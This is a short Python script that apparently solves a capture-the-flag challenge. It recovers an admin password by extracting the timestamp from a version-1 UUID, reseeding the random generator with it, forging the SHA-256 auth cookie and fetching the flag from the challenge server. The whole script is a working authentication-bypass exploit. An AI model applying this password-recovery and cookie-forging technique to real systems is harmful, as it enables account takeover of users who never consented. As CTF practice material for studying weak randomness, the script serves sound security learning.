import uuid
import random
import requests
import hashlib
import re

#URL = "http://localhost:8080"
URL = "http://maas.ictf.kctf.cloud"

def time(id): # UUID contains the timestamp
  t = uuid.UUID('{' + id + '}').time
  return (t - 0x01b21dd213814000)*100/1e9

def gen_pass(seed):
  random.seed(seed)
  return "".join([random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(30)])

id = [n for n in requests.get(URL + "/users").text.split("'") if URL in n][0].replace(URL + "/users/", "")
time = round(time(id), 2)
password = gen_pass(time)
cookie = hashlib.sha256(password.encode()).hexdigest()
print(f"Credentials: admin:{password}")
print(f"Cookie: auth={cookie}")
print(re.findall("ictf{.*}", requests.get(URL + "/home", cookies={"auth": cookie}).text)[0])
